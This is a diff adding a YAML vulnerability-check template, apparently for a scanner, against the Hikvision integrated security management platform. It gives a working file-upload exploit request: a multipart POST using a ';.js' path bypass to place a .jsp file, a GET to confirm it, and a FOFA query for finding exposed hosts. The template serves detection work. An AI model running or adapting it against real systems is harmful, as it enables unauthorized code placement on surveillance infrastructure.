@@ -1,0 +1,39 @@
+id: poc-yaml-hikvision-clusters-anyfile-upload
+info:
+  name: 海康威视综合安防管理平台 clusters 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 海康威视综合安防管理平台
+  fofa: title="综合安防管理平台"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /clusterMgr/clusters/ssl/file;.js
+  headers:
+    Content-Type: multipart/form-data; boundary=--------------------------984514492333278399715408
+  data: '----------------------------984514492333278399715408
+
+    Content-Disposition: form-data; name="file"; filename="languages/{{.t1}}.jsp"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    ----------------------------984514492333278399715408
+
+    Content-Disposition: form-data; name="proxyAddress"
+
+
+    8.8.8.8
+
+    ----------------------------984514492333278399715408--'
+  expression: status_code == 200 && !contains(body,"<")
+- method: GET
+  path: /clusterMgr/languages/{{.t1}}.jsp;.js
+  expression: status_code == 200 && body == t2
+transport: http
